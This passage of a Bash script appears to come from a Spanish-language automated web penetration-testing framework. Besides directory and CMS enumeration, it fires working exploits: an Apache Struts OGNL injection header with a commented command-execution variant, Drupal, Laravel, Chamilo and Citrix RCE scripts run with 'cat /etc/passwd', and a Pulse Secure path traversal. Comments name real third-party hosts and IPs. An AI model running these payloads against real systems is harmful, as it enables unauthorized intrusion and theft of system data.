				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt &

				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos de configuración ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module configApache -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configApache.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configApache.txt &

				waitWeb 0.3
				echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorApache -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webshell.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webshell.txt &

				echo -e "\t\t[+] multiviews check ($proto_http://$host:$port)"
				command="multiviews -url=$proto_http://$host:$port/"
				echo $command > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apache-multiviews.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apache-multiviews.txt
				grep vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apache-multiviews.txt >> .vulnerabilidades/"$host"_"$port"_apache-multiviews.txt
			fi #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module php -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"php-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"php-files.txt &

			fi #oscp
		fi #NO CMS
	fi #hosting domains

	if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
		waitWeb 0.3
		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
		command="$proxychains nmap --script http-slowloris-check -p $port $host"
		echo $command > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"slowloris.txt
		eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"slowloris.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" >> .vulnerabilidades/"$host"_"$port"_slowloris.txt
	fi

	if [ "$INTERNET" == "n" ]; then
		waitWeb 0.3
		echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
		command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error"
		echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosCGI.txt
		eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosCGI.txt &

	else
		grep "is behind" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"wafw00f.txt > .enumeracion/"$host"_"$port"_wafw00f.txt 2>/dev/null
		egrep -iq "is behind" .enumeracion/"$host"_"$port"_wafw00f.txt
		greprc=$?
		if [[ $greprc -eq 1 ]]; then # si hay no hay firewall protegiendo la app
			waitWeb 0.3
			echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
			command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error"
			echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosCGI.txt
			eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosCGI.txt &
		fi
	fi
}


function enumeracionTomcat() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi

    #1: si no existe log
    if [[ ! -e "logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webarchivos.txt" ]]; then
        echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port [$param_msg_error])"

        command="$proxychains curl -k --max-time 10 '$proto_http'://$host:$port/cgi/ism.bat?&dir"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt &

    	curl -k --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http"://"$host":"$port""$path_web" >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheStruts.txt 2>/dev/null&

		# curl -i -s -k  -X $'GET' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' $'https://target'
        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &

		waitWeb 0.3
		echo -e "\t\t[+] Revisando backups ($host - Tomcat)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module backups -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt &


        waitWeb 0.3
        echo -e "\t\t[+] Nuclei tomcat $proto_http $host:$port"
        command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/tomcat_'$MODE'.txt -no-color -include-rr -debug"
        echo $command > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"tomcatNuclei.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"tomcatNuclei.txt 2>&1 &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module tomcat -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosTomcat.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosTomcat.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos peligrosos ($host - Tomcat)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt &
		# gitdumper.sh http://131.161.253.46/.git/ paraguay
    fi

    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
        greprc=$?
        if [[ $greprc -eq 1 ]]; then

            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

                waitWeb 0.3
                echo -e "\t\t[+] Revisando directorios comunes - completo ($host - Tomcat)"
                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
                sleep 1

                waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos por defecto ($host - Tomcat)"
				command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt 
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt &

			fi  #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos jsp ($host - tomcat)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module jsp -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt
			fi #oscp
		fi	#NO CMS
	fi	#hosting domains
}


# xhtml files  
# https://appwebjb.entel.bo/guiatelefonica/faces/
# https://appwebjb.entel.bo/actualizaentel/faces/

# jsp fles
# https://appwebjb.entel.bo/ConsultaGestor/

function enumeracionJava() {
    proto_http=$1
    host=$2
    port=$3
	msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi

    #1: si no existe log
    if [[ ! -e "logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webarchivos.txt" ]]; then
        echo -e "\t\t[+] Enumerar Java ($proto_http : $host : $port [$param_msg_error])"

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - JAVA)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &

      

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - JAVA)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - JAVA)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt &

		waitWeb 0.3
		echo -e "\t\t[+] Revisando backups ($host - java)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module backups -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt &


    fi

    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
        greprc=$?
        if [[ $greprc -eq 1 ]]; then

            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

                waitWeb 0.3
                echo -e "\t\t[+] Revisando directorios comunes - completo  ($host - JAVA)"
                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
                sleep 1

                waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos por defecto ($host - JAVA)"
				command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt 
				eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt &

			fi  #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos jsp ($host - JAVA)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module jsp -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt
			fi #oscp
		fi	#NO CMS
	fi	#hosting domains
}

function enumeracionSAP () {
   proto_http=$1
   host=$2
   port=$3
   msg_error_404=$4 #cadena en comillas simples
  	
	if [ ! -z "$msg_error_404" ];then
		param_msg_error="-error404 $msg_error_404" 
	else
		param_msg_error=""
	fi

   	#1: si no existe log
   	if [[ ! -e logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sapNuclei.txt  ]]; then

		echo -e "\t\t[+] Enumerar SAP ($proto_http : $host : $port [$param_msg_error])"
		waitWeb 0.3
		SAP-scan -url=$proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sap~scan.txt &

		waitWeb 0.3
		echo -e "\t\t[+] Nuclei SAP $proto_http $host:$port"
		nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/sap.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sapNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sapNuclei.txt &

		waitWeb 0.3
		echo -e "\t\t[+] Revisando archivos comunes de SAP ($host - SAP)"
		web-buster -target $host -port $port -proto $proto_http -path $path_web -module sap -threads $hilos_web -redirects 0 -show404 -error404 'setValuesAutoCreation' >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosSAP.txt &
	fi
}


function enumeracionCMS () {
   proto_http=$1
   host=$2
   port=$3

	if [[ "$MODE" == "total" ]]; then
		echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
		$proxychains nmap -n -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"nmapHTTPvuln.txt &
	fi

	#1: si no existe log
   	if [[ ! -e "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"CMScheck.txt"  ]]; then
		touch "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"CMScheck.txt"
		 #######  drupal  ######
		grep -qi drupal logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei Drupal ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"drupalNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"drupalNuclei.txt &

			drupal7-CVE-2018-7600.py "$proto_http"://"$host":"$port""$path_web" -c 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"drupal-CVE~2018~7600.txt 2>/dev/null
			# http://www.mipc.com.bo/node/9/devel/token
			if [[  "$MODE" == "total" ]]; then
				echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
				$proxychains droopescan scan drupal -u  "$proto_http"://$host --output json > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"droopescan.txt 2>/dev/null &
			fi
		fi

		
		#######  yii  ######
		grep -qi yii logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei yii ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/yii_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"yiiNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"yiiNuclei.txt &
			#peticiones get especificas para yii
			checkerWeb.py --tipo yii --url "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"yiiTest.txt
		fi

		#######  laravel  ######
		grep -qi laravel logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei laravel ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/laravel_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"laravelNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"laravelNuclei.txt &
			laravel-rce-CVE-2021-3129.sh "$proto_http"://"$host":"$port""$path_web" 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"laravel-rce-CVE~2021~3129.txt  2>/dev/null
		fi

		#######  magento  ######
		grep -qi magento logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			echo -e "\t\t[+] nuclei magento ("$proto_http"://"$host":"$port")"
			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/magento_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"magentoNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"magentoNuclei.txt &
			laravel-rce-CVE-2021-3129.sh "$proto_http"://"$host":"$port""$path_web" 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"laravel-rce-CVE~2021~3129.txt  2>/dev/null
		fi


		#######  chamilo  ######
		grep -qi Chamilo logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t[+] Revisando vulnerabilidades de Chamilo ($host)"
			echo -e "\t\t[+] CVE-2023-34960 ("$proto_http"://"$host":"$port")"
			echo "chamilo-CVE-2023-34960.py -u \"$proto_http://$host:$port/\"  -c 'uname -a'" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"chamilo~CVE~2023~34960.txt
			chamilo-CVE-2023-34960.py -u "$proto_http"://"$host":"$port""$path_web"  -c 'uname -a' >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"chamilo~CVE~2023~34960.txt &
		fi

		#######  wordpress  ######
		grep -qi wordpress logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then

			grep -qi "\^" "logs/enumeracion/${host}_${port}_${path_web_sin_slash}webDataInfo.txt"
			greprc=$?
			if [[ $greprc -eq 0 ]];then
				newdomain=$(cut -d '^' -f3 "logs/enumeracion/${host}_${port}_${path_web_sin_slash}webDataInfo.txt")
				host=$newdomain
				echo "newdomain $newdomain"
			fi

			if [[ "$port" != "80" && "$port" != '443' ]];then
				wordpress_url="$proto_http"://"$host":"$port""$path_web"
			else
				wordpress_url="$proto_http://$host""$path_web" 
			fi

			echo -e "\t\t[+] Revisando vulnerabilidades de Wordpress ($host)"
			checkerWeb.py --tipo registro --url "$wordpress_url" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cms-registroHabilitado.txt
			wordpress-scan -url $wordpress_url > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressPlugins.txt &
			xml-rpc-test -url $wordpress_url > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"xmlRpcHabilitado.txt &
			xml-rpc-login -url $wordpress_url > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"xml~rpc~login.txt &

			echo -e "\t\t[+] nuclei Wordpress ($wordpress_url)"
			nuclei -u "$wordpress_url"  -id /root/.local/nuclei-templates/cves/wordpress_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressNuclei.txt 2>&1 &

			echo -e "\t\t[+] Wordpress user enumeration ($wordpress_url)"
			$proxychains wpscan --disable-tls-checks  --random-user-agent  --enumerate u  --url "$wordpress_url/" --format json > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpUsers.json &
			wordpress-cve-2017-5487.py --url $wordpress_url >  logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpress-cve~2017~5487.txt &
			echo -e "\t\t[+] wordpress_ghost_scanner ("$wordpress_url")"
			msfconsole -x "use scanner/http/wordpress_ghost_scanner;set RHOSTS $host; set RPORT $port ;run;exit" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressGhost.txt 2>/dev/null &
			wordpress-version.py $wordpress_url > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"wordpressVersion.txt 2>/dev/null
			grep -vi 'Error' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"wordpressVersion.txt > .enumeracion/"$host"_"$port"_wordpressVersion.txt
			wordpress-CVE-2022-21661.py --url "$wordpress_url"wp-admin/admin-ajax.php --payload 1 > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpress~CVE~2022~21661.txt 2>/dev/null &
			wordpress-plugin-cve-2024-1071.py $wordpress_url > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpress~CVE~2024~1071.txt 2>/dev/null &

			# si tiene el valor "internet" (se esta escaneando redes de internet) si no tiene valor se escanea un dominio
			if [[ "$FORCE" != "internet" ]]; then #ejecutar solo cuando se escanea por dominio y no masivamente por IP
				echo -e "\t\t[+] Revisando vulnerabilidades de wordpress (wpscan)"
				$proxychains wpscan --disable-tls-checks  --random-user-agent --url $wordpress_url --enumerate ap,cb,dbe --api-token $TOKEN_WPSCAN --plugins-detection aggressive  > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpscan.txt &
				sleep 5
				grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpscan.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then
					url=`cat logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpscan.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
					echo -e "\t\t[+] url $url ($host: $port)"
					if [[ ${url} == *"$host"*  ]];then
						echo -e "\t\t[+] Redireccion en wordpress $url ($host: $port)"
						$proxychains wpscan --disable-tls-checks --enumerate u  --random-user-agent --format json --url $url > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpUsers.json &
						$proxychains wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token $TOKEN_WPSCAN --plugins-detection aggressive > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpscan.txt &
					else
						echo -e "\t\t[+] Ya lo escaneamos por dominio"
					fi
				fi #redirect
			fi #total
		fi
		# curl -k https://$DOMINIO/wp-json/wp/v2/users
		# curl -k https://$DOMINIO/wp-json/akismet/v1
		# curl -k https://$DOMINIO/wp-json
		# curl -k https://$DOMINIO/wp-json/wp/v2/pages

		###################################

		#######  citrix  ######
		grep -qi citrix logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de citrix ($host)"
			$proxychains CVE-2019-19781.sh $host $port "cat /etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"citrixVul.txt &
		fi
		###################################

		#######  hadoop  ######
		grep -qi 'Hadoop Administration' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Hadoop ($host)"
			echo "$proxychains  nmap -n -Pn --script hadoop-namenode-info -p $port $host" > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"hadoopNamenode.txt
			$proxychains nmap -n -Pn --script hadoop-namenode-info -p $port $host >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"hadoopNamenode.txt &
			#http://182.176.151.83:50070/dfshealth.html
			#http://182.176.151.83:50070/conf
			#docker run  -v "$PWD":/tmp -it exploit-legacy hdfsbrowser 182.176.151.83
		fi
		###################################

		#######  Hadoop YARN ResourceManager  ######
		grep -qi 'YARN' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Hadoop YARN ResourceManager ($host)"
			nuclei -u $host -t /root/.local/nuclei-templates/misconfiguration/hadoop-unauth-rce.yaml  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"hadoopRCE.txt
		fi
		###################################


		#######  Pulse secure  ######
		grep -qi pulse logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Pulse Secure ($host)"
			$proxychains curl --max-time 10 --path-as-is -s -k "$proto_http://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"pulseVul.txt &

		fi
		##################################


		#######  OWA  ######
		egrep -qi "Outlook|owa" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de OWA($host)"

			if [[ ! -z "$URL"  ]];then
				owa_version=`grep -roP 'owa/auth/\K[^/]+' webClone/"$host" | head -1 | cut -d ':' -f2`
				owa.pl -version $owa_version  > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2020~0688.txt
			else
